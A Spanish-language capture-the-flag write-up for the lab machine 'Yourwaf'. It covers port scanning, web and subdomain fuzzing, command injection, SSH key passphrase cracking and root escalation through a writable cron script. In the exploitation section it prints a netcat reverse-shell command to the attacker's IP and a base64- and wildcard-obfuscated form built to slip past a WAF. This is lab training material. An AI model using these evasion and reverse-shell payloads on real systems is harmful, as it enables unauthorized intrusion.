# Máquina Yourwaf

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.141

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80,3000 -vvv -Pn 192.168.5.141

![alt text](image-2.png)


### Fuzing web

feroxbuster --url http://192.168.5.141 -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

lo agregamos al /etc/hosts

![alt text](image-4.png)

buscamos subdominios:

ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://192.168.5.141 -H "Host: FUZZ.yourwaf.nyx" -H "User-Agent: Netscape" -fs 0

![alt text](image-5.png)

agregamos el subdomino al /etc/hosts

![alt text](image-6.png)


### Explotación

Aplicamos una bash con en base64 con caracteres comodín para luego pasarla a texto plano

nc -e /bin/bash 192.168.5.131 443 -> en base64 -> bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNS4xMzEgNDQz

/???/e??o bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNS4xMzEgNDQz | base64 -d | /???/b??h -e

![alt text](image-7.png)

nos ponemos en escucha con netcat por el puerto 443:

![alt text](image-8.png)

utilizando linpeas.sh

![alt text](image-9.png)

analizando el archivo server.js

![alt text](image-10.png)

podemos apuntar a ver archivos sensibles

entonces veo los usuario que se pueden loguear en el sistema:

![alt text](image-11.png)

quise ver el id_rsa de root pero no se puedo, ahora pruebo con tester

![alt text](image-12.png)

crackeamos el passphrase

![alt text](image-13.png)

me conecté por ssh:

![alt text](image-14.png)

### Escalar privilegios

Ejecutando la herramienta pspy64

![alt text](image-15.png)

vi los permisos de copylogs.sh

![alt text](image-17.png)

entonces vi a que grupo pertenezco:

![alt text](image-18.png)

entonces como pertezco al grupo copylogs puedo agregar una línea para que se ejecute como root

![alt text](image-19.png)

me puse en escucha con netcat y listo:

![alt text](image-20.png)

### user.txt

![alt text](image-21.png)

### root.txt

![alt text](image-22.png)